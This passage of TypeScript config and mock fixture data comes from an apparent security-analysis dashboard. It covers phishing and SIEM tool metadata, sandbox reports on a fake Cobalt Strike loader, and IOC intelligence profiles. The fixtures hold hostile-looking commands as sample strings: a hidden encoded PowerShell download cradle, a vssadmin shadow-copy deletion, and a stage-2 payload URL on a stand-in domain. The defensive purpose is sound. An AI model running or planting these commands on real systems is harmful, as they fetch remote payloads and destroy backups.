    hotkey: '4',
    tagline: '11-stage RFC 822 email forensics, auth verification, and payload inspection.',
    description: 'Uncover spoofing, lookalike domains, MTA hop anomalies, credential harvesting forms, and weaponized attachments.',
    accentFrom: '#f43f5e',
    accentTo: '#ec4899',
    defaultPort: 5002,
    apiPrefix: '/api/phishing',
    capabilities: [
      '11-stage forensic pipeline with ~40 weighted threat signals',
      'SPF, DKIM, DMARC, ARC & CompAuth verification + Identity Matrix',
      'Hop-by-hop MTA Received path & TLS encryption visualization',
      'Defanged URL redirect chains & sandboxed HTML mail preview'
    ],
    mainTabs: [
      { id: 'overview', label: 'Overview' },
      { id: 'analysis', label: 'Analysis' }
    ],
    // Bug #1 Fix: Sub-tab ID is strictly 'dashboard', never 'overview' or 'summary'
    subTabs: [
      { id: 'dashboard', label: 'Dashboard' },
      { id: 'sender-auth', label: 'Sender & Auth' },
      { id: 'artifacts', label: 'Artifacts' },
      { id: 'preview', label: 'Preview Mail' }
    ]
  },
  ruleforge: {
    id: 'ruleforge',
    name: 'RuleForge',
    shortName: 'RuleForge',
    hotkey: '5',
    tagline: 'Cross-SIEM detection engineering with refusals-over-approximations.',
    description: 'Author, translate, tune, and test detection logic across 8 SIEM dialects with a deterministic three-valued evaluation engine.',
    accentFrom: '#14b8a6',
    accentTo: '#10b981',
    defaultPort: 8765,
    apiPrefix: '/api/ruleforge',
    capabilities: [
      '8 SIEM dialects (Sentinel, Sigma, Splunk, QRadar, Elastic, Wazuh, Chronicle, CrowdStrike)',
      'Visual pipeline stage & nested AND/OR condition builder',
      'Three-valued sample runner (matched / no_match / not_evaluated)',
      'Log-to-rule synthesis, ReDoS lint & visual version lineage tree'
    ],
    // Bug #2 Fix: Second main tab ID is strictly 'workshop', never 'studio'
    mainTabs: [
      { id: 'overview', label: 'Overview' },
      { id: 'workshop', label: 'Workshop' }
    ],
    subTabs: [
      { id: 'author', label: 'Author' },
      { id: 'tune', label: 'Tune' },
      { id: 'debug', label: 'Debug' },
      { id: 'understand', label: 'Understand' },
      { id: 'history', label: 'History' },
      { id: 'dialects', label: 'Dialects' }
    ]
  }
};

// ============================================================================
// 3. FIXTURE DATA FOR ALL 5 SECURITY ENGINES (src/data/fixtures.ts)
// ============================================================================
export const FIXTURES = {
  malwareReports: [
    {
      id: 'mal-001',
      filename: 'invoice_q3.exe',
      timestamp: '2026-10-14 11:42:18 UTC',
      score: 87,
      tier: 'CRITICAL' as const,
      verdict: 'malicious' as VerdictType,
      format: 'PE32+ executable (GUI) x86-64',
      size: '1.84 MB (1,929,344 bytes)',
      detectionRatio: '52 / 71 engines',
      md5: '8f14e45fceea167a5a36dedd4bea2543',
      sha1: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4',
      sha256: 'a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b',
      ssdeep: '24576:Qp9K7wL2xR8mN4vB1tY6uI0oP3aS5dF7gH9jK:Qp9K7wL2xR8mN4vB1tY6',
      imphash: 'f34d5f2d4577ed6d9ceec516c1f5a744',
      magic: 'PE32+ executable (GUI) x86-64, for MS Windows, 6 sections',
      mitre: [
        { id: 'T1055.002', name: 'Process Injection: Portable Executable Injection', tactic: 'Defense Evasion', url: 'https://attack.mitre.org/techniques/T1055/002/' },
        { id: 'T1059.001', name: 'Command and Scripting Interpreter: PowerShell', tactic: 'Execution', url: 'https://attack.mitre.org/techniques/T1059/001/' },
        { id: 'T1071.001', name: 'Application Layer Protocol: Web Protocols', tactic: 'Command and Control', url: 'https://attack.mitre.org/techniques/T1071/001/' },
        { id: 'T1547.001', name: 'Boot or Logon Autostart Execution: Registry Run Keys', tactic: 'Persistence', url: 'https://attack.mitre.org/techniques/T1547/001/' }
      ],
      summary: 'High-confidence Cobalt Strike / AsyncRAT loader disguised as a Q3 accounting invoice executable. Exhibits high-entropy packed `.rsrc` and `.pdata` sections, classic process hollowing API imports, persistence via HKCU Run key, and encrypted C2 callbacks to 198.51.100.45:443.',
      recommendations: [
        { priority: 'CRITICAL', text: 'Isolate host WKS-FINANCE04 immediately and terminate PID 4812 (invoice_q3.exe) and child PID 6104 (rundll32.exe).' },
        { priority: 'HIGH', text: 'Block egress traffic to 198.51.100.45 and evil-login-portal.com at perimeter firewall and DNS sinkhole.' },
        { priority: 'HIGH', text: 'Sweep enterprise endpoints using the generated Sigma rule for HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefendSync.' },
        { priority: 'MEDIUM', text: 'Reset credentials for user CORP\\j.miller due to potential infostealer memory scraping.' }
      ],
      scoreBreakdown: {
        formatName: 'PE32+',
        reputation: { earned: 23, max: 25 },
        sandbox: { earned: 31, max: 35 },
        static: { earned: 33, max: 40 }
      },
      headers: {
        'Machine': '0x8664 (AMD64)',
        'Number of Sections': '6',
        'TimeDateStamp': '2026-10-12 03:14:09 UTC',
        'Entry Point': '0x00014A80 (.text)',
        'ImageBase': '0x0000000140000000',
        'Subsystem': 'IMAGE_SUBSYSTEM_WINDOWS_GUI (2)',
        'DLL Characteristics': 'DYNAMIC_BASE, HIGH_ENTROPY_VA, NX_COMPAT',
        'Digital Signature': 'Unsigned (No Authenticode certificate present)'
      },
      sections: [
        { name: '.text', vsize: '0x00048000', rsize: '0x00047A00', entropy: 6.42, flags: 'CNT_CODE | MEM_EXECUTE | MEM_READ' },
        { name: '.rdata', vsize: '0x0001B000', rsize: '0x0001AA00', entropy: 5.18, flags: 'CNT_INITIALIZED_DATA | MEM_READ' },
        { name: '.data', vsize: '0x00006000', rsize: '0x00004200', entropy: 4.11, flags: 'CNT_INITIALIZED_DATA | MEM_READ | MEM_WRITE' },
        { name: '.pdata', vsize: '0x00092000', rsize: '0x00091800', entropy: 7.89, flags: 'CNT_INITIALIZED_DATA | MEM_READ (Packed Shellcode)' },
        { name: '.rsrc', vsize: '0x00084000', rsize: '0x00083E00', entropy: 7.94, flags: 'CNT_INITIALIZED_DATA | MEM_READ (Encrypted Payload)' },
        { name: '.reloc', vsize: '0x00003000', rsize: '0x00002800', entropy: 5.02, flags: 'CNT_INITIALIZED_DATA | MEM_DISCARDABLE' }
      ],
      imports: [
        {
          dll: 'KERNEL32.dll',
          apis: [
            { name: 'VirtualAllocEx', suspicious: true, reason: 'Remote memory allocation for process injection' },
            { name: 'WriteProcessMemory', suspicious: true, reason: 'Writes payload bytes into target process' },
            { name: 'CreateRemoteThread', suspicious: true, reason: 'Executes injected code in remote process' },
            { name: 'IsDebuggerPresent', suspicious: true, reason: 'Anti-analysis debugger check' },
            { name: 'GetTickCount64', suspicious: false, reason: 'Timing check' }
          ]
        },
        {
          dll: 'WININET.dll',
          apis: [
            { name: 'InternetOpenUrlW', suspicious: true, reason: 'Direct HTTP/HTTPS C2 staging request' },
            { name: 'InternetReadFile', suspicious: true, reason: 'Reads remote stage-2 beacon stream' }
          ]
        },
        {
          dll: 'ADVAPI32.dll',
          apis: [
            { name: 'RegSetValueExW', suspicious: true, reason: 'Modifies registry keys for persistence' },
            { name: 'AdjustTokenPrivileges', suspicious: true, reason: 'Enables SeDebugPrivilege' }
          ]
        }
      ],
      yaraMatches: [
        { rule: 'MAL_CobaltStrike_Beacon_Loader_x64', source: 'SecConflux-Core-YARA', severity: 'critical', matchedStrings: ['$mz_header', '$beacon_cfg_xor = { 69 68 69 68 69 }', '$pipe_str = "\\\\\\\\.\\\\pipe\\\\MSSE-4812-server"'] },
        { rule: 'SUSP_High_Entropy_Resource_Section', source: 'Neo23x0-Signature-Base', severity: 'high', matchedStrings: ['pe.sections[4].entropy > 7.8'] },
        { rule: 'APT_Process_Hollowing_Imports', source: 'Elastic-Protections', severity: 'high', matchedStrings: ['VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread'] }
      ],
      stringsSample: [
        'https://198.51.100.45:443/api/v2/telemetry/checkin',
        'http://evil-login-portal.com/stage2/beacon_x64.bin',
        'powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA',
        'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefendSync',
        '\\\\.\\pipe\\MSSE-4812-server',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'SeDebugPrivilege',
        'C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll',
        'cmd.exe /c vssadmin delete shadows /all /quiet',
        'SELECT * FROM Win32_ShadowCopy'
      ],
      vendors: [
        {
          name: 'VirusTotal',
          status: 'Malicious (52/71)',
          confidence: 96,
          classification: 'trojan.cobaltstrike/asyncrat',
          rawJson: '{\n  "data": {\n    "id": "a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b",\n    "attributes": {\n      "last_analysis_stats": { "malicious": 52, "suspicious": 4, "undetected": 15 },\n      "popular_threat_classification": { "suggested_threat_label": "trojan.cobaltstrike/beacon" }\n    }\n  }\n}'
        },
        {
          name: 'Hybrid Analysis',
          status: 'Malicious (100/100)',
          confidence: 98,
          classification: 'VX Family: CobaltStrike / Injector',
          rawJson: '{\n  "verdict": "malicious",\n  "threat_score": 100,\n  "vx_family": "CobaltStrike",\n  "mitre_attcks": ["T1055.002", "T1059.001", "T1547.001"]\n}'
        },
        {
          name: 'Hatching Triage',
          status: 'Score 9 / 10',
          confidence: 90,
          classification: 'beacon, c2-http, persistence',
          rawJson: '{\n  "sample": { "score": 9, "tags": ["family:cobaltstrike", "botnet", "persistence"] },\n  "extracted_config": { "c2": ["https://198.51.100.45:443/api/v2/telemetry/checkin"], "sleep": 60000, "jitter": 25 }\n}'
        },
        {
          name: 'FileScan.io',
          status: 'Likely Malicious',
          confidence: 88,
          classification: 'Emulated Shellcode & High Entropy PE',
          rawJson: '{\n  "verdict": "MALICIOUS",\n  "confidence": 0.88,\n  "yara_hits": 3,\n  "extracted_urls": ["https://198.51.100.45:443/api/v2/telemetry/checkin", "http://evil-login-portal.com/stage2/beacon_x64.bin"]\n}'
        }
      ],
      sandboxSignatures: [
        { title: 'Allocates executable memory in remote process (rundll32.exe)', severity: 'critical', category: 'Process Injection' },
        { title: 'Deletes Volume Shadow Copies via vssadmin.exe', severity: 'critical', category: 'Ransomware / Impact' },
        { title: 'Establishes TLS session to unverified certificate on 198.51.100.45:443', severity: 'high', category: 'Command & Control' },
        { title: 'Installs autorun registry key under HKCU\\...\\Run\\WinDefendSync', severity: 'high', category: 'Persistence' }
      ],
      communityComments: [
        { author: '@mal_hunter_soc', date: '2h ago', body: 'Observed in FinTech spearphishing campaign today. C2 198.51.100.45 uses custom Cobalt Strike malleable C2 profile mimicking telemetry checkin.' },
        { author: '@threat_intel_bot', date: '5h ago', body: 'Extracted watermark ID 135902841. Associated with initial access via macro-enabled invoice docs.' }
      ],
      processTree: [
        {
          pid: 4812,
          ppid: 3104,
          name: 'invoice_q3.exe',
          cmd: '"C:\\Users\\j.miller\\Downloads\\invoice_q3.exe"',
          user: 'CORP\\j.miller',
          risk: 'critical',
          details: 'Initial dropper execution; unpacks .rsrc payload and spawns cmd.exe + injects into rundll32.exe.',
          children: [
            {
              pid: 5290,
              ppid: 4812,
              name: 'cmd.exe',
              cmd: 'cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...',
              user: 'CORP\\j.miller',
              risk: 'high',
              details: 'Executes encoded PowerShell staging script and shadow copy deletion.',
              children: [
                {
                  pid: 5912,
                  ppid: 5290,
                  name: 'powershell.exe',
                  cmd: 'powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...',
                  user: 'CORP\\j.miller',
                  risk: 'critical',
                  details: 'Contacts http://evil-login-portal.com/stage2/beacon_x64.bin and writes sync_helper.dll.',
                  children: []
                }
              ]
            },
            {
              pid: 6104,
              ppid: 4812,
              name: 'rundll32.exe',
              cmd: 'C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll,StartWork',
              user: 'CORP\\j.miller',
              risk: 'critical',
              details: 'Hollowed host process maintaining persistent HTTPS beacon to 198.51.100.45:443.',
              children: []
            }
          ]
        }
      ],
      networkActivity: [
        { protocol: 'HTTPS', dstIp: '198.51.100.45', dstPort: 443, domain: 'c2-telemetry.evil-login-portal.com', bytes: '148.2 KB', process: 'rundll32.exe (6104)' },
        { protocol: 'HTTP', dstIp: '203.0.113.88', dstPort: 80, domain: 'evil-login-portal.com', bytes: '412.6 KB', process: 'powershell.exe (5912)' },
        { protocol: 'DNS', dstIp: '8.8.8.8', dstPort: 53, domain: 'evil-login-portal.com', bytes: '1.1 KB', process: 'powershell.exe (5912)' }
      ],
      fileActivity: [
        { action: 'CREATED', path: 'C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll', process: 'powershell.exe (5912)', size: '312 KB' },
        { action: 'MODIFIED', path: 'C:\\Users\\j.miller\\AppData\\Local\\Temp\\~df8192.tmp', process: 'invoice_q3.exe (4812)', size: '64 KB' },
        { action: 'DELETED', path: 'C:\\Users\\j.miller\\Downloads\\invoice_q3.exe:Zone.Identifier', process: 'invoice_q3.exe (4812)', size: '26 B' }
      ],
      registryActivity: [
        { action: 'SET_VALUE', key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefendSync', value: 'rundll32.exe C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll,StartWork', process: 'invoice_q3.exe (4812)' },
        { action: 'SET_VALUE', key: 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\ProgramData\\Microsoft\\Vault', value: '0x00000000', process: 'powershell.exe (5912)' }
      ],
      iocs: [
        { type: 'IPs', value: '198.51.100.45', source: 'Sandbox Network / Memory Config', context: 'Primary HTTPS C2 Beacon Server (Port 443)', verdict: 'malicious' as VerdictType },
        { type: 'IPs', value: '203.0.113.88', source: 'Sandbox Network', context: 'Stage-2 Payload Hosting IP', verdict: 'malicious' as VerdictType },
        { type: 'Domains', value: 'evil-login-portal.com', source: 'PE Strings / DNS Query', context: 'Staging & Credential Harvesting Domain', verdict: 'malicious' as VerdictType },
        { type: 'URLs', value: 'https://198.51.100.45:443/api/v2/telemetry/checkin', source: 'Triage Config Extractor', context: 'Malleable C2 Checkin URI', verdict: 'malicious' as VerdictType },
        { type: 'URLs', value: 'http://evil-login-portal.com/stage2/beacon_x64.bin', source: 'PowerShell Command Line', context: 'Stage-2 Shellcode Payload URL', verdict: 'malicious' as VerdictType },
        { type: 'Hashes', value: 'a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b', source: 'Static File Hash (SHA-256)', context: 'invoice_q3.exe Primary Dropper', verdict: 'malicious' as VerdictType },
        { type: 'Registry', value: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefendSync', source: 'Behavioral Registry Monitor', context: 'User Logon Persistence Key', verdict: 'suspicious' as VerdictType },
        { type: 'Paths', value: 'C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll', source: 'Filesystem Monitor', context: 'Dropped Cobalt Strike Beacon DLL', verdict: 'malicious' as VerdictType }
      ]
    },
    {
      id: 'mal-002',
      filename: 'updater_svc.dll',
      timestamp: '2026-10-14 09:15:04 UTC',
      score: 54,
      tier: 'MEDIUM' as const,
      verdict: 'suspicious' as VerdictType,
      format: 'PE32+ DLL (console) x86-64',
      size: '612 KB (626,688 bytes)',
      detectionRatio: '11 / 71 engines',
      md5: '4c9184f37cff01bcdc32dc486ec36961',
      sha1: '7c4a8d09ca3762af61e59520943dc26494f8941b',
      sha256: 'c91f7a820b44e129d8f3c6a5b2190e84d3a7f61c9e0b2d4a6f8c1e3b5d7a9f02',
      ssdeep: '12288:Lm4N8pQ1vX9zR3cT5yU7iO0aE2wS6dF:Lm4N8pQ1vX9zR3c',
      imphash: 'a12b3c4d5e6f7890123456789abcdef0',
      magic: 'PE32+ executable (DLL) (GUI) x86-64, for MS Windows',
      mitre: [
        { id: 'T1574.002', name: 'Hijack Execution Flow: DLL Side-Loading', tactic: 'Persistence', url: 'https://attack.mitre.org/techniques/T1574/002/' }
      ],
      summary: 'Unsigned third-party updater DLL exhibiting potential DLL side-loading exports and querying system environment variables. Moderate suspicion due to obfuscated string table.',
      recommendations: [
        { priority: 'MEDIUM', text: 'Verify whether updater_svc.dll belongs to an approved vendor deployment package on host WKS-DEV09.' },
        { priority: 'LOW', text: 'Monitor outbound connections from the parent application loading this library.' }
      ],
      scoreBreakdown: {
        formatName: 'PE32+ DLL',
        reputation: { earned: 12, max: 25 },
        sandbox: { earned: 18, max: 35 },
        static: { earned: 24, max: 40 }
      },
      headers: {
        'Machine': '0x8664 (AMD64)',
        'Number of Sections': '5',
        'TimeDateStamp': '2026-09-28 19:02:41 UTC',
        'Entry Point': '0x00002140 (.text)',
        'ImageBase': '0x0000000180000000',
        'Subsystem': 'IMAGE_SUBSYSTEM_WINDOWS_GUI (2)',
        'DLL Characteristics': 'DYNAMIC_BASE, NX_COMPAT',
        'Digital Signature': 'Unsigned'
      },
      sections: [
        { name: '.text', vsize: '0x00032000', rsize: '0x00031800', entropy: 6.15, flags: 'CNT_CODE | MEM_EXECUTE | MEM_READ' },
        { name: '.rdata', vsize: '0x00014000', rsize: '0x00013A00', entropy: 6.78, flags: 'CNT_INITIALIZED_DATA | MEM_READ' }
      ],
      imports: [
        {
          dll: 'KERNEL32.dll',
          apis: [
            { name: 'LoadLibraryExW', suspicious: true, reason: 'Dynamic module loading' },
            { name: 'GetEnvironmentVariableW', suspicious: false, reason: 'Reads system PATH' }
          ]
        }
      ],
      yaraMatches: [
        { rule: 'SUSP_Unsigned_Updater_DLL_Exports', source: 'SecConflux-Core-YARA', severity: 'medium', matchedStrings: ['$export_run = "ServiceMain"'] }
      ],
      stringsSample: ['ServiceMain', 'https://cdn-telemetry-check.net/v1/ping', 'SOFTWARE\\UpdaterService\\Config'],
      vendors: [
        { name: 'VirusTotal', status: 'Suspicious (11/71)', confidence: 62, classification: 'pua.packed/sideload', rawJson: '{"malicious": 11, "suspicious": 5, "undetected": 55}' },
        { name: 'Hybrid Analysis', status: 'Suspicious (55/100)', confidence: 58, classification: 'Unknown unsigned DLL', rawJson: '{"verdict": "suspicious", "threat_score": 55}' }
      ],
      sandboxSignatures: [
        { title: 'Queries proxy configuration from HKCU Internet Settings', severity: 'medium', category: 'Discovery' }
      ],
      communityComments: [],
      processTree: [
        { pid: 2210, ppid: 1040, name: 'rundll32.exe', cmd: 'rundll32.exe updater_svc.dll,ServiceMain', user: 'CORP\\a.patel', risk: 'medium', details: 'Executes exported ServiceMain entrypoint.', children: [] }
      ],
      networkActivity: [
        { protocol: 'HTTPS', dstIp: '198.51.100.201', dstPort: 443, domain: 'cdn-telemetry-check.net', bytes: '14.1 KB', process: 'rundll32.exe (2210)' }
      ],
      fileActivity: [],
      registryActivity: [],
      iocs: [
        { type: 'Domains', value: 'cdn-telemetry-check.net', source: 'Sandbox Network', context: 'Updater Checkin Endpoint', verdict: 'suspicious' as VerdictType },
        { type: 'IPs', value: '198.51.100.201', source: 'Sandbox Network', context: 'Resolved IP for cdn-telemetry-check.net', verdict: 'suspicious' as VerdictType }
      ]
    },
    {
      id: 'mal-003',
      filename: 'putty_clean.exe',
      timestamp: '2026-10-13 16:20:10 UTC',
      score: 8,
      tier: 'LOW' as const,
      verdict: 'clean' as VerdictType,
      format: 'PE32+ executable (GUI) x86-64',
      size: '1.62 MB (1,698,816 bytes)',
      detectionRatio: '0 / 71 engines',
      md5: '098f6bcd4621d373cade4e832627b4f6',
      sha1: 'a94a8fe5ccb19ba61c4c0873d391e987982fbbd3',
      sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      ssdeep: '24576:CleanPuttyHashSample12345:CleanPuttyHash',
      imphash: '11223344556677889900aabbccddeeff',
      magic: 'PE32+ executable (GUI) x86-64, signed by Simon Tatham',
      mitre: [],
      summary: 'Verified Authenticode-signed SSH/Telnet client (PuTTY 0.81). Zero YARA rule matches and 0/71 vendor detections.',
      recommendations: [
        { priority: 'LOW', text: 'No containment required. Binary matches known-good NSRL and vendor Authenticode signature.' }
      ],
      scoreBreakdown: {
        formatName: 'PE32+',
        reputation: { earned: 0, max: 25 },
        sandbox: { earned: 3, max: 35 },
        static: { earned: 5, max: 40 }
      },
      headers: {
        'Machine': '0x8664 (AMD64)',
        'Digital Signature': 'Valid (Signed by Simon Tatham, DigiCert SHA2 Assured ID)'
      },
      sections: [
        { name: '.text', vsize: '0x0009A000', rsize: '0x00099800', entropy: 6.21, flags: 'CNT_CODE | MEM_EXECUTE | MEM_READ' }
      ],
      imports: [],
      yaraMatches: [],
      stringsSample: ['PuTTY-Release-0.81', 'ssh-ed25519', 'Simon Tatham'],
      vendors: [
        { name: 'VirusTotal', status: 'Clean (0/71)', confidence: 100, classification: 'signed.known-good', rawJson: '{"malicious": 0, "harmless": 68, "undetected": 3}' }
      ],
      sandboxSignatures: [],
      communityComments: [],
      processTree: [],
      networkActivity: [],
      fileActivity: [],
      registryActivity: [],
      iocs: []
    }
  ]
};


export const MORE_FIXTURES = {
  iocProfiles: {
    '198.51.100.45': {
      ioc: '198.51.100.45',
      type: 'IPv4 Address',
      verdict: 'malicious' as VerdictType,
      score: 92,
      whyVerdict: 'Flagged as active Cobalt Strike / AsyncRAT C2 infrastructure by 19 of 28 queried intelligence providers, with recent Hudson Rock infostealer callbacks and Shodan self-signed TLS fingerprint match.',
      votes: { malicious: 19, suspicious: 4, clean: 3, unknown: 7 },
      geo: { country: 'Netherlands (NL)', city: 'Amsterdam', asn: 'AS209401 (BulletProof Hosting B.V.)', org: 'NexusCloud Infrastructure Ltd', isp: 'NexusCloud Transit', coords: '52.3676° N, 4.9041° E' },
      dns: [
        { type: 'PTR', name: '45.100.51.198.in-addr.arpa', value: 'edge-gw45.evil-login-portal.com', ttl: '300s' },
        { type: 'A', name: 'c2-telemetry.evil-login-portal.com', value: '198.51.100.45', ttl: '60s' },
        { type: 'MX', name: 'evil-login-portal.com', value: '10 mail.evil-login-portal.com', ttl: '3600s' },
        { type: 'TXT', name: 'evil-login-portal.com', value: 'v=spf1 ip4:198.51.100.0/24 ~all', ttl: '3600s' }
      ],
      ssl: {
        subject: 'CN=*.microsoft-telemetry-sync.com (Self-Signed)',
        issuer: 'CN=*.microsoft-telemetry-sync.com',
        ja3s: 'f4febc55ea12b31ae17cfb7e614afda8 (Cobalt Strike Default)',
        serial: '00:8C:91:F4:22:09:AB:14:FE',
        validFrom: '2026-09-30',
        validTo: '2027-09-30'
      },
      whois: {
        registrar: 'NameCheap / PrivacyGuardian LLC',
        created: '2026-09-29',
        expires: '2027-09-29',
        registrant: 'Redacted for Privacy (Bulletproof ASN)',
        abuseContact: 'abuse@nexuscloud-infra.example'
      },
      subdomains: [
        { fqdn: 'c2-telemetry.evil-login-portal.com', firstSeen: '2026-10-01', certIssuer: 'Self-Signed' },
        { fqdn: 'auth-sso.evil-login-portal.com', firstSeen: '2026-10-03', certIssuer: 'Let\'s Encrypt R3' },
        { fqdn: 'stage2.evil-login-portal.com', firstSeen: '2026-10-08', certIssuer: 'Let\'s Encrypt R3' }
      ],
      shodan: {
        os: 'Ubuntu Linux 22.04 LTS',
        ports: [22, 80, 443, 8443, 50050],
        services: [
          { port: 22, proto: 'tcp', banner: 'OpenSSH 8.9p1 Ubuntu-3ubuntu0.10' },
          { port: 80, proto: 'tcp', banner: 'nginx/1.18.0 (Redirect to HTTPS)' },
          { port: 443, proto: 'tcp', banner: 'HTTP/1.1 404 Not Found (Cobalt Strike Malleable C2)' },
          { port: 50050, proto: 'tcp', banner: 'Cobalt Strike TeamServer Default Port (Filtered)' }
        ],
        vulns: ['CVE-2024-6387 (regreSSHion)', 'CVE-2023-44487 (HTTP/2 Rapid Reset)']
      },
      abuseIpdb: {
        confidenceScore: 99,
        totalReports: 318,
        lastReported: '14 minutes ago',
        categories: ['C2 Server', 'Phishing Hosting', 'Port Scan', 'Brute-Force SSH']
      },
      urlscan: {
        verdict: 'Malicious — Credential Harvester / C2 Staging',
        domStats: '42 DOM nodes · 3 external scripts · 1 hidden iframe · 2 TLS redirects',
        contactedDomains: ['evil-login-portal.com', 'c2-telemetry.evil-login-portal.com', 'cdn.jsdelivr.net'],
        pageTitle: 'Microsoft 365 — Re-authenticate Session'
      },
      hudsonRock: {
        compromisedHosts: 14,
        stealerFamilies: ['LummaC2', 'RedLine', 'AsyncRAT'],
        lastInfectionDate: '2026-10-13 21:08 UTC'
      },
      providers: [
        { name: 'VirusTotal', verdict: 'malicious' as VerdictType, confidence: 96, summary: '19/91 security vendors flagged this IP as Cobalt Strike C2', latency: '184ms', status: 'queried' as const },
        { name: 'AbuseIPDB', verdict: 'malicious' as VerdictType, confidence: 99, summary: '99% abuse confidence across 318 distinct reporter networks', latency: '142ms', status: 'queried' as const },
        { name: 'Shodan', verdict: 'malicious' as VerdictType, confidence: 94, summary: 'Port 50050 & Cobalt Strike JA3S TLS fingerprint detected', latency: '220ms', status: 'queried' as const },
        { name: 'AlienVault OTX', verdict: 'malicious' as VerdictType, confidence: 91, summary: 'Included in 12 active pulses (FinTech Spearphishing Q4)', latency: '195ms', status: 'queried' as const },
        { name: 'GreyNoise', verdict: 'suspicious' as VerdictType, confidence: 82, summary: 'Classification: Malicious — Opportunistic & Targeted C2 traffic', latency: '160ms', status: 'queried' as const },
        { name: 'ThreatFox (abuse.ch)', verdict: 'malicious' as VerdictType, confidence: 98, summary: 'Matched IOC #1309481: Cobalt Strike HTTPS Beacon', latency: '118ms', status: 'queried' as const },
        { name: 'urlscan.io', verdict: 'malicious' as VerdictType, confidence: 90, summary: 'Hosts stage2 payload & Microsoft 365 credential phish', latency: '310ms', status: 'queried' as const },
        { name: 'Hudson Rock', verdict: 'malicious' as VerdictType, confidence: 89, summary: 'Observed as exfiltration C2 in 14 LummaC2 stealer logs', latency: '265ms', status: 'queried' as const },
        { name: 'Censys', verdict: 'suspicious' as VerdictType, confidence: 78, summary: 'Self-signed certificate spoofing microsoft-telemetry-sync.com', latency: '290ms', status: 'queried' as const },
        { name: 'CrowdSec CTI', verdict: 'malicious' as VerdictType, confidence: 88, summary: 'High aggression score: http-probing, c2-callback', latency: '175ms', status: 'queried' as const },
        { name: 'Pulsedive', verdict: 'malicious' as VerdictType, confidence: 92, summary: 'Risk: Critical — Linked to evil-login-portal.com', latency: '205ms', status: 'queried' as const },
        { name: 'Cloudflare Radar', verdict: 'info' as VerdictType, confidence: 60, summary: 'ASN AS209401 high-risk hosting provider', latency: '130ms', status: 'queried' as const },
        { name: 'Recorded Future', verdict: 'unknown' as VerdictType, confidence: 0, summary: 'Skipped — Enterprise API key not configured', latency: '—', status: 'skipped' as const, missingKey: 'RECORDED_FUTURE_API_KEY' },
        { name: 'Mandiant Advantage', verdict: 'unknown' as VerdictType, confidence: 0, summary: 'Skipped — Enterprise API key not configured', latency: '—', status: 'skipped' as const, missingKey: 'MANDIANT_API_KEY' }
      ],
      relationships: {
        nodes: [
          { id: '198.51.100.45', label: '198.51.100.45', type: 'IP', x: 340, y: 170, connections: 5 },
          { id: 'evil-login-portal.com', label: 'evil-login-portal.com', type: 'Domain', x: 160, y: 80, connections: 4 },
          { id: 'a4f8d91c...1e31b', label: 'invoice_q3.exe (SHA256)', type: 'Hash', x: 520, y: 85, connections: 3 },
          { id: 'https://198.51.100.45:443/api/v2/telemetry/checkin', label: '/api/v2/telemetry/checkin', type: 'URL', x: 530, y: 260, connections: 2 },
          { id: 'billing-urgent@evil-login-portal.com', label: 'billing-urgent@evil-login...', type: 'Email', x: 150, y: 265, connections: 3 },
          { id: '203.0.113.88', label: '203.0.113.88', type: 'IP', x: 340, y: 300, connections: 2 }
        ],
        edges: [
          { source: '198.51.100.45', target: 'evil-login-portal.com', relation: 'resolves_to' },
          { source: '198.51.100.45', target: 'a4f8d91c...1e31b', relation: 'c2_contacted_by' },
          { source: '198.51.100.45', target: 'https://198.51.100.45:443/api/v2/telemetry/checkin', relation: 'hosts_uri' },
          { source: 'evil-login-portal.com', target: 'billing-urgent@evil-login-portal.com', relation: 'sender_domain' },
          { source: 'evil-login-portal.com', target: '203.0.113.88', relation: 'failover_a_record' },
          { source: 'a4f8d91c...1e31b', target: 'billing-urgent@evil-login-portal.com', relation: 'delivered_by' }
        ]
      }
    },
    'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh': {
      ioc: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
      type: 'Bitcoin Wallet (Bech32)',
      verdict: 'malicious' as VerdictType,
      score: 88,
      whyVerdict: 'Wallet address is associated with ransomware extortion notes and high-risk mixing service hops across Chainalysis and Abuse.ch.',
      votes: { malicious: 14, suspicious: 3, clean: 1, unknown: 15 },
      wallet: {
        chain: 'Bitcoin (BTC)',
        balance: '4.81920411 BTC ($312,480 USD)',
        totalReceived: '19.45000000 BTC',
        txCount: 84,
        firstSeen: '2026-07-14',
        fundingSources: ['Wasabi CoinJoin Mixer (62%)', 'Extortion Victim Deposits (38%)'],
        sanctionsCheck: 'Flagged in Ransomware Extortion Cluster #8812'
      }
    },
    '+1-415-890-9912': {
      ioc: '+1-415-890-9912',
      type: 'Phone Number (E.164)',
      verdict: 'suspicious' as VerdictType,
      score: 68,
      whyVerdict: 'Non-fixed VoIP number provisioned via bulk SIP trunk; reported in 27 vishing / IT Helpdesk social engineering callbacks.',
      votes: { malicious: 6, suspicious: 11, clean: 2, unknown: 14 },
      phoneIntel: {
